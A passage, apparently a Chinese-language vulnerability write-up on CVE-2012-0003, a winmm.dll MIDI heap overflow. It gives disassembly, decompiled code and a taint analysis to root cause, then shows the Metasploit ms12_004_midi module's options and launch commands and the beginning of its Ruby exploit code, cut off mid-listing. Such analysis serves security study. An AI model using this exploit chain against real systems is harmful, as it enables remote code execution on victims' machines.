00             jns     loc_76B2D276.text:76B2D11B.text:76B2D121 83 C1 03                      add     ecx, 3.text:76B2D124 83 E1 FC                      and     ecx, 0FFFFFFFCh.text:76B2D127 01 4E 24                      add     [esi+24h], ecx.text:76B2D12A E9 47 01 00 00                jmp     loc_76B2D276.text:76B2D12A.text:76B2D12F                               ; ---------------------------------------------------------------------------.text:76B2D12F.text:76B2D12F                               loc_76B2D12F:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+DF↑j.text:76B2D12F 83 C1 03                      add     ecx, 3.text:76B2D132 83 E1 FC                      and     ecx, 0FFFFFFFCh.text:76B2D135 01 4E 24                      add     [esi+24h], ecx.text:76B2D138 33 C9                         xor     ecx, ecx.text:76B2D13A 41                            inc     ecx.text:76B2D13B 83 7D EC FF                   cmp     [ebp+var_14], 0FFFFFFFFh.text:76B2D13F 8B C1                         mov     eax, ecx.text:76B2D141 75 06                         jnz     short loc_76B2D149.text:76B2D141.text:76B2D143 8B 87 8C 00 00 00             mov     eax, [edi+8Ch].text:76B2D143.text:76B2D149.text:76B2D149                               loc_76B2D149:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+109↑j.text:76B2D149 8B 5E 18                      mov     ebx, [esi+18h].text:76B2D14C 83 A7 88 00 00 00 00          and     dword ptr [edi+88h], 0.text:76B2D153 83 4F 08 20                   or      dword ptr [edi+8], 20h.text:76B2D157 85 C0                         test    eax, eax.text:76B2D159 89 4F 34                      mov     [edi+34h], ecx.text:76B2D15C 74 31                         jz      short loc_76B2D18F.text:76B2D15C.text:76B2D15E 89 45 08                      mov     [ebp+wParam], eax.text:76B2D15E.text:76B2D161.text:76B2D161                               loc_76B2D161:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+155↓j.text:76B2D161 8B 73 04                      mov     esi, [ebx+4].text:76B2D164 8D 46 40                      lea     eax, [esi+40h].text:76B2D167 89 43 04                      mov     [ebx+4], eax.text:76B2D16A FF 76 20                      push    dword ptr [esi+20h].text:76B2D16D 57                            push    edi.text:76B2D16E E8 84 F6 FF FF                call    _mseIDtoHMidi@8                 ; mseIDtoHMidi(x,x).text:76B2D16E.text:76B2D173 85 C0                         test    eax, eax.text:76B2D175 74 13                         jz      short loc_76B2D18A.text:76B2D175.text:76B2D177 6A 40                         push    40h ; &#x27;@&#x27;                       ; cbmh.text:76B2D179 56                            push    esi                             ; pmh.text:76B2D17A 50                            push    eax                             ; hmo.text:76B2D17B E8 39 C0 FF FF                call    _midiOutLongMsg@12              ; midiOutLongMsg(x,x,x).text:76B2D17B.text:76B2D180 85 C0                         test    eax, eax.text:76B2D182 75 06                         jnz     short loc_76B2D18A.text:76B2D182.text:76B2D184 FF 87 88 00 00 00             inc     dword ptr [edi+88h].text:76B2D184.text:76B2D18A.text:76B2D18A                               loc_76B2D18A:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+13D↑j.text:76B2D18A                                                                       ; midiOutPlayNextPolyEvent(x)+14A↑j.text:76B2D18A FF 4D 08                      dec     [ebp+wParam].text:76B2D18D 75 D2                         jnz     short loc_76B2D161.text:76B2D18D.text:76B2D18F.text:76B2D18F                               loc_76B2D18F:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+124↑j.text:76B2D18F 83 BF 88 00 00 00 00          cmp     dword ptr [edi+88h], 0.text:76B2D196 75 04                         jnz     short loc_76B2D19C.text:76B2D196.text:76B2D198 83 67 34 00                   and     dword ptr [edi+34h], 0.text:76B2D198.text:76B2D19C.text:76B2D19C                               loc_76B2D19C:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+15E↑j.text:76B2D19C 83 67 08 DF                   and     dword ptr [edi+8], 0FFFFFFDFh.text:76B2D1A0 E9 D1 00 00 00                jmp     loc_76B2D276.text:76B2D1A0.text:76B2D1A5                               ; ---------------------------------------------------------------------------.text:76B2D1A5.text:76B2D1A5                               loc_76B2D1A5:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+D6↑j.text:76B2D1A5 FF 77 7C                      push    dword ptr [edi+7Ch].text:76B2D1A8 89 4F 30                      mov     [edi+30h], ecx.text:76B2D1AB 57                            push    edi.text:76B2D1AC E8 73 F8 FF FF                call    _midiOutSetClockRate@8          ; midiOutSetClockRate(x,x).text:76B2D1AC.text:76B2D1B1 E9 C0 00 00 00                jmp     loc_76B2D276.text:76B2D1B1.text:76B2D1B6                               ; ---------------------------------------------------------------------------.text:76B2D1B6.text:76B2D1B6                               loc_76B2D1B6:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+CF↑j.text:76B2D1B6 39 5D F4                      cmp     [ebp+hmo], ebx.text:76B2D1B9 8B B7 84 00 00 00             mov     esi, [edi+84h].text:76B2D1BF 0F 84 B1 00 00 00             jz      loc_76B2D276.text:76B2D1BF.text:76B2D1C5 84 C9                         test    cl, cl.text:76B2D1C7 8A C1                         mov     al, cl.text:76B2D1C9 8B D9                         mov     ebx, ecx.text:76B2D1CB 78 16                         js      short loc_76B2D1E3.text:76B2D1CB.text:76B2D1CD 8A 47 54                      mov     al, [edi+54h].text:76B2D1D0 88 4D 0B                      mov     byte ptr [ebp+wParam+3], cl.text:76B2D1D3 0F B6 D0                      movzx   edx, al.text:76B2D1D6 C1 E1 08                      shl     ecx, 8.text:76B2D1D9 C1 EB 08                      shr     ebx, 8.text:76B2D1DC 0B CA                         or      ecx, edx.text:76B2D1DE 89 4D F8                      mov     [ebp+var_8], ecx.text:76B2D1E1 EB 0E                         jmp     short loc_76B2D1F1.text:76B2D1E1.text:76B2D1E3                               ; ---------------------------------------------------------------------------.text:76B2D1E3.text:76B2D1E3                               loc_76B2D1E3:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+193↑j.text:76B2D1E3 8B D1                         mov     edx, ecx.text:76B2D1E5 C1 EA 08                      shr     edx, 8.text:76B2D1E8 88 4F 54                      mov     [edi+54h], cl.text:76B2D1EB 88 55 0B                      mov     byte ptr [ebp+wParam+3], dl.text:76B2D1EE C1 EB 10                      shr     ebx, 10h.text:76B2D1EE.text:76B2D1F1.text:76B2D1F1                               loc_76B2D1F1:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1A9↑j.text:76B2D1F1 8A D0                         mov     dl, al.text:76B2D1F3 80 E2 F0                      and     dl, 0F0h.text:76B2D1F6 80 FA 90                      cmp     dl, 90h.text:76B2D1F9 88 55 FF                      mov     [ebp+var_1], dl.text:76B2D1FC 74 05                         jz      short loc_76B2D203.text:76B2D1FC.text:76B2D1FE 80 FA 80                      cmp     dl, 80h.text:76B2D201 75 5C                         jnz     short loc_76B2D25F.text:76B2D201.text:76B2D203.text:76B2D203                               loc_76B2D203:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1C4↑j.text:76B2D203 0F B6 55 0B                   movzx   edx, byte ptr [ebp+wParam+3].text:76B2D207 83 E0 0F                      and     eax, 0Fh.text:76B2D20A C1 E0 07                      shl     eax, 7.text:76B2D20D 03 C2                         add     eax, edx.text:76B2D20F 99                            cdq.text:76B2D210 2B C2                         sub     eax, edx.text:76B2D212 D1 F8                         sar     eax, 1.text:76B2D214 80 7D FF 80                   cmp     [ebp+var_1], 80h.text:76B2D218 74 2A                         jz      short loc_76B2D244.text:76B2D218.text:76B2D21A 84 DB                         test    bl, bl.text:76B2D21C 74 26                         jz      short loc_76B2D244.text:76B2D21C.text:76B2D21E 03 F0                         add     esi, eax.text:76B2D220 F6 45 0B 01                   test    byte ptr [ebp+wParam+3], 1.text:76B2D224 8A 06                         mov     al, [esi].text:76B2D226 8A D0                         mov     dl, al.text:76B2D228 74 0C                         jz      short loc_76B2D236.text:76B2D228.text:76B2D22A 80 E2 F0                      and     dl, 0F0h.text:76B2D22D 80 FA F0                      cmp     dl, 0F0h.text:76B2D230 74 2D                         jz      short loc_76B2D25F.text:76B2D230.text:76B2D232 04 10                         add     al, 10h.text:76B2D234 EB 0A                         jmp     short loc_76B2D240.text:76B2D234.text:76B2D236                               ; ---------------------------------------------------------------------------.text:76B2D236.text:76B2D236                               loc_76B2D236:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1F0↑j.text:76B2D236 80 E2 0F                      and     dl, 0Fh.text:76B2D239 80 FA 0F                      cmp     dl, 0Fh.text:76B2D23C 74 21                         jz      short loc_76B2D25F.text:76B2D23C.text:76B2D23E FE C0                         inc     al.text:76B2D23E.text:76B2D240.text:76B2D240                               loc_76B2D240:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1FC↑j.text:76B2D240 88 06                         mov     [esi], al.text:76B2D242 EB 1B                         jmp     short loc_76B2D25F.text:76B2D242.text:76B2D244                               ; ---------------------------------------------------------------------------.text:76B2D244.text:76B2D244                               loc_76B2D244:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1E0↑j.text:76B2D244                                                                       ; midiOutPlayNextPolyEvent(x)+1E4↑j.text:76B2D244 F6 45 0B 01                   test    byte ptr [ebp+wParam+3], 1.text:76B2D248 8D 14 30                      lea     edx, [eax+esi].text:76B2D24B 8A 02                         mov     al, [edx].text:76B2D24D 74 08                         jz      short loc_76B2D257.text:76B2D24D.text:76B2D24F A8 F0                         test    al, 0F0h.text:76B2D251 74 0C                         jz      short loc_76B2D25F.text:76B2D251.text:76B2D253 2C 10                         sub     al, 10h.text:76B2D255 EB 06                         jmp     short loc_76B2D25D.text:76B2D255.text:76B2D257                               ; ---------------------------------------------------------------------------.text:76B2D257.text:76B2D257                               loc_76B2D257:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+215↑j.text:76B2D257 A8 0F                         test    al, 0Fh.text:76B2D259 74 04                         jz      short loc_76B2D25F.text:76B2D259.text:76B2D25B FE C8                         dec     al.text:76B2D25B.text:76B2D25D.text:76B2D25D                               loc_76B2D25D:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+21D↑j.text:76B2D25D 88 02                         mov     [edx], al.text:76B2D25D.text:76B2D25F.text:76B2D25F                               loc_76B2D25F:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1C9↑j.text:76B2D25F                                                                       ; midiOutPlayNextPolyEvent(x)+1F8↑j.text:76B2D25F                                                                       ; midiOutPlayNextPolyEvent(x)+204↑j.text:76B2D25F                                                                       ; midiOutPlayNextPolyEvent(x)+20A↑j.text:76B2D25F                                                                       ; midiOutPlayNextPolyEvent(x)+219↑j.text:76B2D25F                                                                       ; midiOutPlayNextPolyEvent(x)+221↑j.text:76B2D25F 51                            push    ecx                             ; dwMsg.text:76B2D260 FF 75 F4                      push    [ebp+hmo]                       ; hmo.text:76B2D263 E8 CA BE FF FF                call    _midiOutShortMsg@8              ; midiOutShortMsg(x,x).text:76B2D263.text:76B2D268 EB 0C                         jmp     short loc_76B2D276.text:76B2D268.text:76B2D26A                               ; ---------------------------------------------------------------------------.text:76B2D26A.text:76B2D26A                               loc_76B2D26A:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+246↓j.text:76B2D26A 57                            push    edi                             ; wParam.text:76B2D26B E8 57 F8 FF FF                call    _midiOutDequeueAndCallback@4    ; midiOutDequeueAndCallback(x).text:76B2D26B.text:76B2D270 83 7F 3C 00                   cmp     dword ptr [edi+3Ch], 0.text:76B2D274 74 0A                         jz      short loc_76B2D280.text:76B2D274.text:76B2D276.text:76B2D276                               loc_76B2D276:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+E3↑j.text:76B2D276                                                                       ; midiOutPlayNextPolyEvent(x)+F2↑j.text:76B2D276                                                                       ; midiOutPlayNextPolyEvent(x)+168↑j.text:76B2D276                                                                       ; midiOutPlayNextPolyEvent(x)+179↑j.text:76B2D276                                                                       ; midiOutPlayNextPolyEvent(x)+187↑j.text:76B2D276                                                                       ; midiOutPlayNextPolyEvent(x)+230↑j.text:76B2D276 57                            push    edi.text:76B2D277 E8 0E F8 FF FF                call    _midiOutScheduleNextEvent@4     ; midiOutScheduleNextEvent(x).text:76B2D277.text:76B2D27C 85 C0                         test    eax, eax.text:76B2D27E 74 EA                         jz      short loc_76B2D26A.text:76B2D27E.text:76B2D280.text:76B2D280                               loc_76B2D280:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+23C↑j.text:76B2D280 83 7F 34 00                   cmp     dword ptr [edi+34h], 0.text:76B2D284 0F 84 C6 FD FF FF             jz      loc_76B2D050.text:76B2D284.text:76B2D28A.text:76B2D28A                               loc_76B2D28A:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+1D↑j.text:76B2D28A                                                                       ; midiOutPlayNextPolyEvent(x)+4E↑j.text:76B2D28A 5E                            pop     esi.text:76B2D28B 5B                            pop     ebx.text:76B2D28B.text:76B2D28C.text:76B2D28C                               loc_76B2D28C:                           ; CODE XREF: midiOutPlayNextPolyEvent(x)+10↑j.text:76B2D28C 5F                            pop     edi.text:76B2D28D C9                            leave.text:76B2D28E C2 04 00                      retn    4.text:76B2D28E.text:76B2D28E                               _midiOutPlayNextPolyEvent@4 endp.text:76B2D28E.text:76B2D28E                               ; ----------------------------------------------------------------------\n\n反编译得到\nvoid __stdcall midiOutPlayNextPolyEvent(WPARAM wParam)&#123;  WPARAM *v2; // esi  WPARAM v3; // ecx  int v4; // eax  bool v5; // cc  WPARAM v6; // edx  WPARAM v7; // ebx  unsigned int v8; // ecx  unsigned int v9; // eax  unsigned int v10; // ecx  char v11; // al  int v12; // eax  WPARAM v13; // ebx  struct midihdr_tag *v14; // esi  HMIDIOUT v15; // eax  int v16; // esi  unsigned __int8 v17; // al  unsigned int v18; // ebx  int v19; // eax  char *v20; // esi  char v21; // al  char v22; // dl  char v23; // al  _BYTE *v24; // edx  char v25; // al  char v26; // al  int v27; // [esp-Ch] [ebp-24h]  int v28; // [esp-Ch] [ebp-24h]  int v29; // [esp+4h] [ebp-14h]  WPARAM v30; // [esp+8h] [ebp-10h]  HMIDIOUT hmo; // [esp+Ch] [ebp-Ch]  unsigned int v32; // [esp+10h] [ebp-8h]  char v33; // [esp+17h] [ebp-1h]  WPARAM wParama; // [esp+20h] [ebp+8h]  WPARAM wParamb; // [esp+20h] [ebp+8h]  char wParam_3; // [esp+23h] [ebp+Bh]  unsigned __int8 wParam_3a; // [esp+23h] [ebp+Bh]  if ( !*(_DWORD *)(wParam + 52) )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        v2 = *(WPARAM **)(wParam + 60);        if ( !v2 )          return;        if ( midiOutScheduleNextEvent(wParam) )          break;        midiOutDequeueAndCallback(wParam);      &#125;      v3 = *v2;      v4 = *(_DWORD *)(wParam + 124) + *(_DWORD *)(*v2 + v2[9]);      v5 = v4 &lt;= *(_DWORD *)(wParam + 128);      wParama = *v2;      *(_DWORD *)(wParam + 116) = v4;      if ( !v5 )        return;      v6 = v2[9];      *(_DWORD *)(wParam + 124) = v4;      v2[9] += 4;      v7 = v2[9];      v27 = *(_DWORD *)(v7 + v3);      v7 += 4;      v30 = v6;      v29 = v27;      v2[9] = v7;      hmo = (HMIDIOUT)mseIDtoHMidi(wParam, v27);      v8 = *(_DWORD *)(v7 + wParama);      v2[9] = v7 + 4;      v9 = HIBYTE(v8);      v10 = v8 &amp; 0xFFFFFF;      wParam_3 = v9;      v32 = v10;      if ( hmo &amp;&amp; (v9 &amp; 0x40) != 0 )      &#123;        v2[7] = v30;        DriverCallback(          *(_DWORD *)(wParam + 68),          *(unsigned __int16 *)(wParam + 74),          *(HDRVR *)(wParam + 4),          0x3CAu,          *(_DWORD *)(wParam + 76),          (DWORD_PTR)v2,          0);        LOBYTE(v9) = wParam_3;        v10 = v32;      &#125;      v11 = v9 &amp; 0xBF;      if ( v11 )      &#123;        if ( v11 == 1 )        &#123;          v28 = *(_DWORD *)(wParam + 124);          *(_DWORD *)(wParam + 48) = v10;          midiOutSetClockRate(wParam, v28);        &#125;        else if ( (unsigned __int8)v11 == 128 )        &#123;          v2[9] += (v10 + 3) &amp; 0xFFFFFFFC;          v12 = 1;          if ( v29 == -1 )            v12 = *(_DWORD *)(wParam + 140);          v13 = v2[6];          *(_DWORD *)(wParam + 136) = 0;          *(_DWORD *)(wParam + 8) |= 0x20u;          *(_DWORD *)(wParam + 52) = 1;          if ( v12 )          &#123;            wParamb = v12;            do            &#123;              v14 = *(struct midihdr_tag **)(v13 + 4);              *(_DWORD *)(v13 + 4) = v14 + 1;              v15 = (HMIDIOUT)mseIDtoHMidi(wParam, v14-&gt;dwReserved[0]);              if ( v15 &amp;&amp; !midiOutLongMsg(v15, v14, 0x40u) )                ++*(_DWORD *)(wParam + 136);              --wParamb;            &#125;            while ( wParamb );          &#125;          if ( !*(_DWORD *)(wParam + 136) )            *(_DWORD *)(wParam + 52) = 0;          *(_DWORD *)(wParam + 8) &amp;= ~0x20u;        &#125;        else if ( v11 &lt; 0 )        &#123;          v2[9] += (v10 + 3) &amp; 0xFFFFFFFC;        &#125;        goto LABEL_48;      &#125;      v16 = *(_DWORD *)(wParam + 132);      if ( hmo )        break;      do      &#123;LABEL_48:        if ( midiOutScheduleNextEvent(wParam) )          break;        midiOutDequeueAndCallback(wParam);      &#125;      while ( *(_DWORD *)(wParam + 60) );      if ( *(_DWORD *)(wParam + 52) )        return;    &#125;    v17 = v10;    if ( (v10 &amp; 0x80u) != 0 )    &#123;      *(_BYTE *)(wParam + 84) = v10;      wParam_3a = BYTE1(v10);      v18 = HIWORD(v10);    &#125;    else    &#123;      v17 = *(_BYTE *)(wParam + 84);      wParam_3a = v10;      v18 = v10 &gt;&gt; 8;      v10 = v17 | (v10 &lt;&lt; 8);    &#125;    v33 = v17 &amp; 0xF0;    if ( (v17 &amp; 0xF0) == 0x90 || (v17 &amp; 0xF0) == 0x80 )    &#123;      v19 = (wParam_3a + ((v17 &amp; 0xF) &lt;&lt; 7)) / 2;      if ( v33 == (char)0x80 || !(_BYTE)v18 )      &#123;        v24 = (_BYTE *)(v19 + v16);        v25 = *(_BYTE *)(v19 + v16);        if ( (wParam_3a &amp; 1) != 0 )        &#123;          if ( (v25 &amp; 0xF0) == 0 )            goto LABEL_46;          v26 = v25 - 16;        &#125;        else        &#123;          if ( (v25 &amp; 0xF) == 0 )            goto LABEL_46;          v26 = v25 - 1;        &#125;        *v24 = v26;        goto LABEL_46;      &#125;      v20 = (char *)(v19 + v16);      v21 = *v20; //! Crash Point      v22 = *v20;      if ( (wParam_3a &amp; 1) != 0 )      &#123;        if ( (v22 &amp; 0xF0) != 0xF0 )        &#123;          v23 = v21 + 16;LABEL_39:          *v20 = v23;  //! Exploit Point        &#125;      &#125;      else if ( (v22 &amp; 0xF) != 15 )      &#123;        v23 = v21 + 1; //! Exploit Point        goto LABEL_39;      &#125;    &#125;LABEL_46:    midiOutShortMsg(hmo, v10);    goto LABEL_48;  &#125;&#125;\n\n异常发生在\nv20 = (char *)(v19 + v16);v21 = *v20; //! Crash Point\n\n以 Crash Point 处的变量 v20 作为污点汇聚点,对函数进行后向分析得到的污点传播路径如下\nvoid __stdcall midiOutPlayNextPolyEvent(WPARAM wParam) &#123;    if ( !*(_DWORD *)(wParam + 52) ) &#123;        while ( 1 ) &#123;            while ( 1 ) &#123;                v2 = *(WPARAM **)(wParam + 60);                if ( !v2 )                    return;                if ( midiOutScheduleNextEvent(wParam) )                    break;                midiOutDequeueAndCallback(wParam);            &#125;            ...            v2[9] += 4;            v7 = v2[9];            ...            v7 += 4;            ...            v8 = *(_DWORD *)(v7 + wParama);            ...            v10 = v8 &amp; 0xFFFFFF;            ...            v16 = *(_DWORD *)(wParam + 132);            ...        &#125;        v17 = v10;        if ( (v10 &amp; 0x80u) != 0 ) &#123;        ...        wParam_3a = BYTE1(v10);        ...        &#125;        else &#123;            v17 = *(_BYTE *)(wParam + 84);            wParam_3a = v10;            ...        &#125;        v33 = v17 &amp; 0xF0;        if ( (v17 &amp; 0xF0) == 0x90 || (v17 &amp; 0xF0) == 0x80 ) &#123;            v19 = (wParam_3a + ((v17 &amp; 0xF) &lt;&lt; 7)) / 2;            ...            v20 = (char *)(v19 + v16);            v21 = *v20; //! Crash Point            ...        &#125;        ...    &#125;&#125;\n\n其中 wParam 为函数的参数。通过交叉引用可以定位到崩溃函数 midiOutPlayNextPolyEvent 的主调函数 midiOutTimerTick,其反编译代码与污点传播相关的部分如下\nvoid __stdcall midiOutTimerTick(UINT uTimerID, UINT uMsg, DWORD_PTR dwUser, DWORD_PTR dw1, DWORD_PTR dw2) &#123;    ...    if ( !guMIDIInTimer ) &#123;        v6 = (_DWORD *)gpEmuList;        guMIDIInTimer = 1;        if ( gpEmuList ) &#123;            do &#123;                v7 = clockTime(v6 + 22);                v8 = v6[13] == 0;                v6[32] = v7;                if ( v8 ) &#123;                    if ( !PDEVLOCK(v6) )                        midiOutPlayNextPolyEvent((WPARAM)v6);                    PDEVUNLOCK(v6);                &#125;                ...            &#125;            while ( v6 );        &#125;        ...    &#125;    ...&#125;\n\n查看污染源 gpEmuList 的交叉引用,发现它在函数 mseOpen 中赋值,在该函数的反编译代码中发现\nMMRESULT __stdcall mseOpen(_DWORD *a1, _DWORD *a2, int a3) &#123;    ...    if ( v4 &lt; 0x10000 ) &#123;        v5 = (char *)winmmAlloc(v4);        if ( v5 ) &#123;            v6 = (int)winmmAlloc(0x400u);            *((_DWORD *)v5 + 0x21) = v6; // 0x21 * 4 = 0x84            if ( v6 ) &#123;                ...                if ( v7 ) &#123;                    ...                &#125;                else &#123;                    if ( mmInitializeCriticalSection((LPCRITICAL_SECTION)(v5 + 16)) ) &#123;                        clockInit((int)(v5 + 88), 0, 0, (int)mseTimebase);                        midiOutSetClockRate((int)v5, 0);                        if ( !v13 )&#123;                            *(_DWORD *)v5 = gpEmuList;                            gpEmuList = (WPARAM)v5; // gpEmuList assignment                            *a1 = v5;                            return v13;                        &#125;                    &#125;                    else &#123;                        v13 = 7;                    &#125;                &#125;            &#125;            ...        &#125;    &#125;    return v13;&#125;\n\n该变量为 winmmAlloc 分配的堆指针,该堆分配函数具体实现的反编译代码为\nvoid *__stdcall winmmAlloc(SIZE_T dwBytes) &#123;    void *v1; // edx    void *result; // eax    v1 = HeapAlloc(hHeap, 0, dwBytes);    result = 0;    if ( v1 ) &#123;        memset(v1, 0, dwBytes);        return v1;    &#125;    return result;&#125;\n\n以上的污点分析意味着\nESI = v20    = (char *)(v19 + v16)    = (char *)(v19 + *(_DWORD *)(wParam + 0x84)) // v16 = *(_DWORD *)(wParam + 0x84);    = (char *)(v19 + *(_DWORD *)(gpEmuList + 0x84)) // wParam = v6 = (_DWORD *)gpEmuList;    = (char *)(v19 + *(_DWORD *)(v5 + 0x84)) // gpEmuList = (WPARAM)v5;    = (char *)(v19 + *(_DWORD *)v6) // *((_DWORD *)v5 + 0x21) = v6; (0x21 * 4 = 0x84)    = (char *)(v19 + *(_DWORD *)winmmAlloc(0x400u)) // v6 = (int)winmmAlloc(0x400u);\n\n因此 v16 实际上是一个大小为 0x400 的堆块的堆指针,并且也是 v20 寻址时的基地址,相应的 v19 则为偏移地址。但 v19 相较于 v16 有着更多的执行路径,没那么方便进行静态分析。不过根据动态调试结果可以发现 v19 = (0xB2 + 0xF &lt;&lt; 7) / 2 = 0x419 &gt; 0x400。因此程序发生堆溢出导致 Access Violation 异常。仅凭借目前的信息与对崩溃函数的简单观察难以找到漏洞发生的 root cause,为此我们需要理解函数内与程序崩溃有关的各个变量的含义与上下文。《漏洞战争》针对这个问题提出了基于导图推算的漏洞分析方法,即设置多个断点尤其是条件断点记录它们在每次运行时发生的变化,并借助这些信息推断各个变量之间的关系与各自的实际含义。其详细分析过程在此不过多赘述,总之通过观察样本与条件断点的输出能够推断出 v17 为状态码,为使程序通过判断条件走到包含 Exploit Point 的执行路径,v17 在这些约束条件下的最大值为 0x9F,样本选择了该最大值。因此 ((v17 &amp; 0xF) &lt;&lt; 7) &#x3D; 0x780,当 wParam_3a 大于 0x80 时,程序将发生堆溢出。同时 wParam_3a 为音符编号,且按照 MIDI 格式规范其最大值为 0x7F,而样本将其修改为 0xB2,大于 0x80,故未经检验得到的偏移地址大于堆块大小,程序存在堆溢出漏洞。这个漏洞产生的后果是\n      v20 = (char *)(v19 + v16);      v21 = *v20; //! Crash Point      v22 = *v20;      if ( (wParam_3a &amp; 1) != 0 )      &#123;        if ( (v22 &amp; 0xF0) != 0xF0 )        &#123;          v23 = v21 + 16;LABEL_39:          *v20 = v23;  //! Exploit Point        &#125;      &#125;      else if ( (v22 &amp; 0xF) != 15 )      &#123;        v23 = v21 + 1; //! Exploit Point        goto LABEL_39;      &#125;\n\n当 (wParam_3a &amp; 1) == 0 且 (v22 &amp; 0xF) != 15 时,程序将依次执行 v21 = *v20;, v23 = v21 + 1; 和 *v20 = v23; 三条语句。因此,该漏洞会使得溢出位置的数据增一。\n这个漏洞在利用时最妙的地方就是配合 preliminary 中提到的堆溢出高级利用方式,通过将类型值为 0x08 的 String 对象通过增一修改成类型值为 0x09 的 Object 对象,进而控制虚表指针实现 RCE\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2012-0003\n\n搜索结果\nMatching Modules================   #  Name                                   Disclosure Date  Rank    Check  Description   -  ----                                   ---------------  ----    -----  -----------   0  exploit/windows/browser/ms12_004_midi  2012-01-10       normal  No     MS12-004 midiOutPlayNextPolyEvent Heap Overflow   1    \\_ target: Automatic                 .                .       .      .   2    \\_ target: IE 6 on Windows XP SP3    .                .       .      .   3    \\_ target: IE 7 on Windows XP SP3    .                .       .      .   4    \\_ target: IE 8 on Windows XP SP3    .                .       .      .Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/browser/ms12_004_midiAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;IE 8 on Windows XP SP3&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/ms12_004_midimsf6 exploit(windows/browser/ms12_004_midi) &gt; info\n\n模块详情信息\n       Name: MS12-004 midiOutPlayNextPolyEvent Heap Overflow     Module: exploit/windows/browser/ms12_004_midi   Platform: Windows       Arch: Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2012-01-10Provided by:  Shane Garrett  juan vazquez &lt;juan.vazquez@metasploit.com&gt;  sinn3r &lt;sinn3r@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Automatic      1   IE 6 on Windows XP SP3      2   IE 7 on Windows XP SP3      3   IE 8 on Windows XP SP3Check supported:  NoBasic options:  Name       Current Setting  Required  Description  ----       ---------------  --------  -----------  OBFUSCATE  false            no        Enable JavaScript obfuscation  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen                                         on all addresses.  SRVPORT    8080             yes       The local port to listen on.  SSL        false            no        Negotiate SSL for incoming connections  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                     no        The URI to use for this exploit (default is random)Payload information:  Space: 1024Description:  This module exploits a heap overflow vulnerability in the Windows Multimedia  Library (winmm.dll). The vulnerability occurs when parsing specially crafted  MIDI files.  Remote code execution can be achieved by using the Windows Media Player  ActiveX control.    Exploitation is done by supplying a specially crafted MIDI file with  specific events, causing the offset calculation being higher than what is  available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing  us to either &quot;inc al&quot; or &quot;dec al&quot; a byte.  This can be used to corrupt an array  (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects,  which leverages remote code execution under the context of the user.    Note: At this time, for IE 8 target, msvcrt ROP is used by default. However,  if you know your target&#x27;s patch level, you may also try the &#x27;MSHTML&#x27; advanced  option for an info leak based attack.  Currently, this module only supports two  MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3.  Or 8.0.6001.19120, which is patch level before the MS12-004 fix.    Also, based on our testing, the vulnerability does not seem to trigger when  the victim machine is operated via rdesktop.References:  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-004  https://nvd.nist.gov/vuln/detail/CVE-2012-0003  OSVDB (78210)  http://www.securityfocus.com/bid/51292View the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/ms12_004_midi) &gt; set payload windows/execmsf6 exploit(windows/browser/ms12_004_midi) &gt; set CMD calc.exemsf6 exploit(windows/browser/ms12_004_midi) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其响应 HTML 页面和异常 MIDI 文件以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/browser/ms12_004_midi.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpServer::HTML  include Msf::Exploit::RopDb  def initialize(info=&#123;&#125;)    super(update_info(info,        &#x27;Name&#x27;           =&gt; &quot;MS12-004 midiOutPlayNextPolyEvent Heap Overflow&quot;,        &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,        &#x27;License&#x27;        =&gt; MSF_LICENSE,        &#x27;Author&#x27;         =&gt; [...],        &#x27;References&#x27;     =&gt; [...],        &#x27;Payload&#x27;        =&gt; &#123;...&#125;,        &#x27;DefaultOptions&#x27; =&gt; &#123;...&#125;,        &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,        &#x27;Targets&#x27;        =&gt; [...],        &#x27;Privileged&#x27;     =&gt; false,        &#x27;DisclosureDate&#x27; =&gt; &#x27;2012-01-10&#x27;,        &#x27;DefaultTarget&#x27;  =&gt; 0))        register_options([...])  end  def exploit    @m_name, @midi       = get_midi    @ml_name, @midi_leak = get_midi(&quot;leak&quot;)    @second_stage_url    = rand_text_alpha(10)    @leak_param          = rand_text_alpha(5)    # Offset to CFunctionPointer vftable in MSHTML    case 